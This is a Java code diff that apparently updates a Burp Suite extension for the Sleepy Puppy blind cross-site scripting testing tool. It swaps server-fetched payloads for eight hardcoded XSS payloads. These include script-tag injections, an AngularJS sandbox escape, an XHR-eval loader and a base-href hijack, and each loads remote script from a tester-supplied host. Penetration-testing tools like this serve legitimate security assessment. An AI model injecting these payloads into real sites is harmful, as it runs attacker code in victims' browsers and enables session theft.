@@ -20,6 +20,7 @@ import java.util.Map;
 
 /**
  * Created by rperam on 10/2/15.
+ * Updated by lardern on 09/16/19
  */
 public class SleepyPuppyConnector {
 
@@ -37,14 +38,9 @@ public class SleepyPuppyConnector {
         return sleepyPuppyData;
     }
 
-    public void refreshDataElements(JComboBox assessmentList, JComboBox payloadList, JLabel accessLogCountLabel,
-                                    JLabel captureCountLabel, JLabel genericCollectorCountLabel) {
-        if (connectionSuccess && (assessmentList.getSelectedIndex() > -1)) {
-            refreshPayloadList(assessmentList, payloadList);
-            refreshAccessLogList(assessmentList, accessLogCountLabel);
-            refreshCaptureList(assessmentList, captureCountLabel);
-            refreshGenericCollectorList(assessmentList, genericCollectorCountLabel);
-        }
+    public void refreshDataElements(String url, JComboBox payloadList, JLabel accessLogCountLabel,
+                                    JLabel captureCountLabel, JLabel genericCollectorCountLabel, IBurpExtenderCallbacks callbacks) {
+            refreshPayloadList(url, payloadList, callbacks);
     }
 
     public void refreshAssessmentList(JComboBox assessmentList) {
@@ -71,27 +67,11 @@ public class SleepyPuppyConnector {
         }
     }
 
-    private void refreshPayloadList(JComboBox assessmentList, JComboBox payloadList) {
-        String selectedAssessmentName = (String) assessmentList.getSelectedItem();
-        if (selectedAssessmentName != null && !selectedAssessmentName.isEmpty()) {
-            Map<String, String> sleepyPuppyAssessments = sleepyPuppyData.getSleepyPuppyAssessments();
-            if (sleepyPuppyAssessments != null && sleepyPuppyAssessments.size() > 0) {
-                String selectedAssessmentId = null;
-                for (Map.Entry<String, String> pair : sleepyPuppyAssessments.entrySet()) {
-                    if (pair.getValue().equals(selectedAssessmentName)) {
-                        selectedAssessmentId = pair.getKey();
-                    }
-                }
-                if (selectedAssessmentId != null && !selectedAssessmentId.isEmpty()) {
-                    // fetch payload list from Sleepy Puppy
-                    String payloads = SleepyPuppyHttpUtil.sendGetRequest(stderr,
-                            sleepyPuppyData.getSleepyPuppyServerUrl()
-                                    + SleepyPuppyConstants.ASSESSMENT_PAYLOADS_URL
-                                    + "/" + selectedAssessmentId,
-                            sleepyPuppyData.getSleepyPuppyUserApiKey());
-
+    private void refreshPayloadList(String url, JComboBox payloadList, IBurpExtenderCallbacks callbacks) {
+      
+                    
                     // parse payload list and load them in to SleepyPuppyData instance
-                    parsePayloads(payloads);
+                    parsePayloads(url);
 
                     // refresh payload list
                     payloadList.removeAllItems();
@@ -101,11 +81,7 @@ public class SleepyPuppyConnector {
                             payloadList.addItem(payloadName);
                         }
                     }
-                }
-            } else {
-                stderr.println("Unable to fetch payload list from Sleepy Puppy Server");
-            }
-        }
+            
     }
 
     private void refreshAccessLogList(JComboBox assessmentList, JLabel accessLogCountLabel) {
@@ -243,24 +219,19 @@ public class SleepyPuppyConnector {
         }
     }
 
-    private void parsePayloads(String payloads) {
-        if (!payloads.equals("{}")) {
-            SleepyPuppyJsonMapper<String[]> jsonMapper = new SleepyPuppyJsonMapper<>();
-            String[] sleepyPuppyPayloadArray = jsonMapper.fromJson(stderr, payloads, String[].class);
-            if (sleepyPuppyPayloadArray != null) {
+    private void parsePayloads(String url) {
+                // TODO: At some point reference this externally... and map to url vs hardcode :)
                 List<String> payloadList = new ArrayList<>();
-                for (int idx = sleepyPuppyPayloadArray.length - 1; idx >= 0; idx--) {
-                    payloadList.add(sleepyPuppyPayloadArray[idx]);
-                }
 
+                payloadList.add(String.format("\"><script src='//%s'></script>", url));
+                payloadList.add(String.format("{{constructor.constructor(\"d=document; _ = d.createElement('script');_.src='//%s';d.body.appendChild(_)\")()}}", url));
+                payloadList.add(String.format("\"><img src='//%s/mH'/>", url));
+                payloadList.add(String.format("\"><script>$.getScript(\"//%s\")</script>", url));
+                payloadList.add(String.format("\"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//%s\");a.send();</script>", url));
+                payloadList.add(String.format("\"><base href=\"%s\">", url));
+                payloadList.add(String.format("\"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\\"})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//%s`}//' allowscriptaccess=always>", url));
+                payloadList.add(String.format("\"><body onpageshow=\"eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//%s\\';d.body.appendChild(_)')\">", url));
                 sleepyPuppyData.setSleepyPuppyAssessmentPayloads(payloadList);
-            } else {
-                stderr.println("Unable to fetch payload list from Sleepy Puppy Server");
-            }
-        } else {
-            stderr.println("Did not receive any payloads from SleepyPuppy server for the selected Assessment");
-            sleepyPuppyData.setSleepyPuppyAssessmentPayloads(new ArrayList<>());
-        }
     }
 
     private void parseAccessLogs(String accessLogs) {
